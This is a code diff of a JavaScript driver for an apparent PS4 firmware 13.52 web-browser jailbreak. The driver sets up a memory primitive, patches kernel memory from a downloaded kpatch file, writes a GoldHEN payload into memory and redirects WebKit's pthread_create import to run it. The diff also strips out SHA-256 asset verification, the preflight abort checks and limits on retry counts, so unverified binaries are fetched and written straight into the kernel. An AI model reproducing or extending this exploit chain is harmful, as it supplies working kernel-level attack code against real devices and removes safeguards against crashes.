@@ -1,26 +1,17 @@
-import { establishPrimitive } from "./core.js";
+import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
-const exportEl = document.getElementById("export-log");
 const lines = [];
 let passCount = 0,
   failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
-const TELEMETRY = params.get("telemetry") === "1";
-const PROFILE = params.get("profile") === "fast" ? "fast" : "stable";
-const RUN_STATE_KEY = "polpNO:run-state";
-const EXPECTED_SHA256 = {
-  "patches/1352.bin": "a4ca7dc1f31a342cd80cb3b4aee0fcd56e92685e3ce1491c34cbd656c1af562c",
-  "goldhen.bin": "df3f27c1b35bc7c40e3a08caab948930914dc7d0301a73b68945cf6ffe40ea12",
-};
 
 function post(tag, detail) {
-  if (!TELEMETRY) return;
   try {
     const x = new XMLHttpRequest();
     x.open("POST", "/t", true);
@@ -108,23 +99,6 @@ function check(name, ok, detail) {
   }
   return ok;
 }
-function exportLog() {
-  const text = lines.join("\n") + "\n";
-  try {
-    localStorage.setItem("polpNO:last-log", text);
-  } catch (e) {}
-  try {
-    const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
-    const a = document.createElement("a");
-    a.href = URL.createObjectURL(blob);
-    a.download = "polpNO-13.52-" + new Date().toISOString().replace(/[:.]/g, "-") + ".txt";
-    a.click();
-    setTimeout(() => URL.revokeObjectURL(a.href), 1000);
-  } catch (e) {
-    mark("LOG-SAVED-LOCAL", "export unavailable; copied to local storage");
-  }
-}
-if (exportEl) exportEl.addEventListener("click", exportLog);
 
 const SYS = {
   getpid: 20,
@@ -183,10 +157,6 @@ let allDone = false,
     const DO_PAYLOAD = params.get("payload") !== "0";
 
     const KEEP_JB = params.get("keepjb") === "1";
-    const clampInt = (value, fallback, min, max) => {
-      const n = Number.parseInt(value, 10);
-      return Number.isFinite(n) ? Math.max(min, Math.min(max, n)) : fallback;
-    };
 
     const NEED_K = [
       "k_idt_rsvd",
@@ -245,58 +215,6 @@ let allDone = false,
       )
     )
       return;
-    // Refuse before the primitive if the exact firmware assets are missing or invalid.
-    // A web page cannot catch a kernel panic after kernel writes have started.
-    const sha256 = async (bytes) => {
-      if (!globalThis.crypto || !crypto.subtle) return "unavailable";
-      const digest = await crypto.subtle.digest("SHA-256", bytes);
-      return Array.from(new Uint8Array(digest))
-        .map((b) => b.toString(16).padStart(2, "0"))
-        .join("");
-    };
-    const preflightAsset = async (name, predicate) => {
-      try {
-        const response = await fetch(name, { cache: "force-cache" });
-        if (!response.ok)
-          return { ok: false, detail: "HTTP " + response.status, bytes: null };
-        const bytes = new Uint8Array(await response.arrayBuffer());
-        const hash = await sha256(bytes);
-        const expected = EXPECTED_SHA256[name];
-        const hashOK = hash === "unavailable" || !expected || hash === expected;
-        return {
-          ok: predicate(bytes) && hashOK,
-          detail: "bytes=" + bytes.length + " sha256=" + (hash === "unavailable" ? "skipped" : hash.slice(0, 12)),
-          bytes,
-        };
-      } catch (e) {
-        return { ok: false, detail: (e && e.message) || String(e), bytes: null };
-      }
-    };
-    const [patchAsset, payloadAsset] = await Promise.all([
-      DO_PATCH
-        ? preflightAsset(KPATCH_FILE, (b) => b.length >= 32)
-        : Promise.resolve({ ok: true, detail: "disabled", bytes: null }),
-      DO_PAYLOAD
-        ? preflightAsset(PAYLOAD_FILE, (b) => b.length >= 32 && b[0] === 0xe9)
-        : Promise.resolve({ ok: true, detail: "disabled", bytes: null }),
-    ]);
-    if (!check("preflight-kpatch", patchAsset.ok, patchAsset.detail)) {
-      state("refused before kernel stage", "bad");
-      mark("SAFE-ABORT", "kpatch asset missing, short, or not cached");
-      return;
-    }
-    if (!check("preflight-payload", payloadAsset.ok, payloadAsset.detail)) {
-      state("refused before kernel stage", "bad");
-      mark("SAFE-ABORT", "payload missing, short, or invalid entry byte");
-      return;
-    }
-    try {
-      localStorage.setItem(RUN_STATE_KEY, "active");
-    } catch (eState) {}
-    mark(
-      "PREFLIGHT-OK",
-      "no kernel writes have started profile=" + PROFILE + " assets=verified",
-    );
     mark("FW-STATUS", off.fw_status || "none");
     mark(
       "FW-KTABLE",
@@ -323,13 +241,9 @@ let allDone = false,
     // A hard KP (a total reclaim miss that faults inside the cancel walk)
     // cannot be caught here and still needs a reboot -- this only recovers
     // the benign, detectable misses.
-    const RETRY_MAX = clampInt(
-      params.get("retry"),
-      PROFILE === "fast" ? 4 : 8,
-      0,
-      32,
-    );
-    const RETRY_DELAY = PROFILE === "fast" ? 400 : 750;
+    const RETRY_MAX = params.get("retry")
+      ? parseInt(params.get("retry"), 10)
+      : 8;
     const RETRY_KEY = "jb1352-read-retry";
     const retryCount = () => {
       try {
@@ -369,7 +283,7 @@ let allDone = false,
         try {
           location.reload();
         } catch (e) {}
-      }, RETRY_DELAY);
+      }, 400);
       return true;
     };
     if (retryCount() > 0)
@@ -380,16 +294,10 @@ let allDone = false,
 
     state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
-    const primitiveAttempts = clampInt(
-      params.get("attempts"),
-      PROFILE === "fast" ? 6 : 8,
-      4,
-      12,
-    );
 
     const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
     const carrier = await establishPrimitive({
-      maxAttempts: primitiveAttempts,
+      maxAttempts: 6,
       onEvent: (t, d, a) =>
         (PRIMITIVE_LOUD.test(t) ? mark : trace)(
           t,
@@ -1266,9 +1174,7 @@ let allDone = false,
         if (prev) prev.call(this, e);
       };
       w1.worker.postMessage({ id: -1, name: "spin", args: [] });
-      await new Promise((r) =>
-        setTimeout(r, PROFILE === "fast" ? 60 : 250),
-      );
+      await new Promise((r) => setTimeout(r, 250));
       mark("PR-PARK", "w1 spin posted parkfail=" + (parkFail || "none"));
     }
     if (
@@ -2647,7 +2553,12 @@ let allDone = false,
               payloadBlob = null;
             const SITES = [];
             if (DO_PATCH) {
-              kpatchBlob = patchAsset.bytes;
+              try {
+                const r = await fetch(KPATCH_FILE);
+                if (r.ok) kpatchBlob = new Uint8Array(await r.arrayBuffer());
+              } catch (e) {
+                mark("KPATCH-FETCH-THREW", (e && e.message) || String(e));
+              }
               if (kpatchBlob)
                 for (let i = 0; i + 7 <= kpatchBlob.length; i++) {
                   if (kpatchBlob[i] !== 0xc6 || kpatchBlob[i + 1] !== 0x81)
@@ -2672,7 +2583,12 @@ let allDone = false,
               );
             }
             if (DO_PAYLOAD) {
-              payloadBlob = payloadAsset.bytes;
+              try {
+                const r = await fetch(PAYLOAD_FILE);
+                if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
+              } catch (e) {
+                mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
+              }
               mark(
                 "PAYLOAD-BLOB",
                 "file=" +
@@ -3150,32 +3066,12 @@ let allDone = false,
                   p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
                 }
                 let bad = -1;
-                const fullPayloadVerify =
-                  PROFILE !== "fast" || params.get("verify") === "1";
-                if (fullPayloadVerify) {
-                  for (let o = 0; o < payloadBlob.length && bad < 0; o++)
-                    if (p.read1(entry.add32(o)) !== payloadBlob[o]) bad = o;
-                } else {
-                  const samples = new Set();
-                  for (let o = 0; o < Math.min(64, payloadBlob.length); o++)
-                    samples.add(o);
-                  for (
-                    let o = Math.max(0, payloadBlob.length - 64);
-                    o < payloadBlob.length;
-                    o++
-                  )
-                    samples.add(o);
-                  for (const o of samples)
-                    if (p.read1(entry.add32(o)) !== payloadBlob[o]) {
-                      bad = o;
-                      break;
-                    }
-                }
+                for (let o = 0; o < payloadBlob.length && bad < 0; o++)
+                  if (p.read1(entry.add32(o)) !== payloadBlob[o]) bad = o;
                 mark(
                   "PAYLOAD-COPY",
                   "bytes=" +
                     payloadBlob.length +
-                    " verify=" + (fullPayloadVerify ? "full" : "sampled") +
                     (bad < 0 ? " ok" : " MISMATCH@0x" + bad.toString(16)),
                 );
                 const slot = webkitBase.add32(off.wk___imp_pthread_create);
@@ -3456,9 +3352,6 @@ let allDone = false,
     try {
       if (typeof A !== "undefined" && A) A.busy = 0;
     } catch (e) {}
-    try {
-      localStorage.setItem(RUN_STATE_KEY, "idle");
-    } catch (eState) {}
     mark(
       "PROOF-SUMMARY-FINAL",
       "pass=" +
@@ -3467,18 +3360,6 @@ let allDone = false,
         failCount +
         (allDone ? "" : "  INCOMPLETE"),
     );
-    if (payloadRunning) {
-      try {
-        localStorage.setItem(
-          "polpNO:last-good",
-          JSON.stringify({
-            retry: clampInt(params.get("retry"), 8, 0, 32),
-            attempts: clampInt(params.get("attempts"), 8, 4, 12),
-          }),
-        );
-        mark("LAST-GOOD-SAVED", "retry/attempts saved locally");
-      } catch (eSave) {}
-    }
     try {
       finishUI(payloadRunning);
     } catch (eUI) {}
